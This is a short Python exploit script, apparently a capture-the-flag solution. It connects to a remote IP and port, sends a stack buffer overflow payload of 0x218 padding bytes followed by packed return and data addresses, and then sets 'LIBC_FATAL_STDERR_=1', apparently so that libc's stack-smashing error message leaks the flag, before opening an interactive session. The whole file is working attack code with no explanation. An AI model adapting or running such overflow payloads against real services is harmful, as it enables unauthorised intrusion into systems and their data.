from pwn_expoit import *

s = Netcon('136.243.194.62',1024)
recvuntil(s,"name?")

dat  = ""
dat += 'A'*0x218
dat += p64(0x400d20)
dat += p64(0)
dat += p64(0x600d20)

s.send(dat+"\n")
recvuntil(s,"flag:")
s.send("LIBC_FATAL_STDERR_=1\n")
interact(s)

